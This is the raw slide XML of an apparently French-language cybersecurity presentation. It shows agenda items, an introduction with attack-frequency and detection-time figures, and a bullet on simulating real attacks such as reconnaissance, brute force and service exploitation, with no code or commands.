              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>complet</a:t>
            </a:r>
            <a:endParaRPr sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Google Shape;56;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="2496312"/>
            <a:ext cx="5349240" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9756"/>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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6382512" y="2496312"/>
            <a:ext cx="822960" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0">
              <a:buClr>
                <a:srgbClr val="0E9E5E"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="Google Shape;58;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="2496312"/>
            <a:ext cx="4251960" cy="7498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500"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Extension : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>réponse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>automatique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="Google Shape;59;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="3538728"/>
            <a:ext cx="5349240" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9756"/>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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3717174" y="3506778"/>
            <a:ext cx="822900" cy="749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86C0"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Cambria"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E86C0"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>05</a:t>
            </a:r>
            <a:endParaRPr sz="2200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Google Shape;61;p4"/>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a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="Google Shape;62;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4384632" y="3494990"/>
            <a:ext cx="4251900" cy="749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500"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Conclusion &amp; perspectives</a:t>
            </a:r>
            <a:endParaRPr sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none"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barn(inVertical)">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barn(inVertical)">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barn(inVertical)">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barn(inVertical)">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barn(inVertical)">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barn(inVertical)">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5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barn(inVertical)">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58"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="barn(inVertical)">
                                      <p:cBhvr>
                                        <p:cTn id="42" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="58"/>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barn(inVertical)">
                                      <p:cBhvr>
                                        <p:cTn id="47" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="60"/>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62"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="barn(inVertical)">
                                      <p:cBhvr>
                                        <p:cTn id="5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2" grpId="0"/>
      <p:bldP spid="43" grpId="0"/>
      <p:bldP spid="54" grpId="0"/>
      <p:bldP spid="55" grpId="0"/>
      <p:bldP spid="57" grpId="0"/>
      <p:bldP spid="58" grpId="0"/>
      <p:bldP spid="60" grpId="0"/>
      <p:bldP spid="6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
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Google Shape;68;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="384048"/>
            <a:ext cx="10058400" cy="2926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86C0"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0E86C0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>01 · CONTEXTE</a:t>
            </a:r>
            <a:endParaRPr sz="1300" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="Google Shape;69;p5"/>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F172A"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Introduction</a:t>
            </a:r>
            <a:endParaRPr sz="3600" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="Google Shape;70;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="6675120" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>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F172A"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Aujourd'hui</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>, la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>cybersécurité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> est un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>enjeu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> critique. Un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>système</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>connecté</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>subit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> tentative </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>d'attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>toutes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> les 39 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>secondes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>. Et le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>délai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> moyen de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> est de 204 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>jours</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ce</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> qui laisse un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>attaquant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>opérer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> pendant des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>mois</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> sans </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>être</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>détecté</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="Google Shape;71;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2743200"/>
            <a:ext cx="6675120" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9756"/>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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="749808" y="2935224"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E11D4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
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="2816352"/>
            <a:ext cx="580644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400"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Simuler des attaques réelles</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="Google Shape;74;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="3127248"/>
            <a:ext cx="580644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B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Reconnaissance réseau, brute force, exploitation de services vulnérables</a:t>
            </a:r>
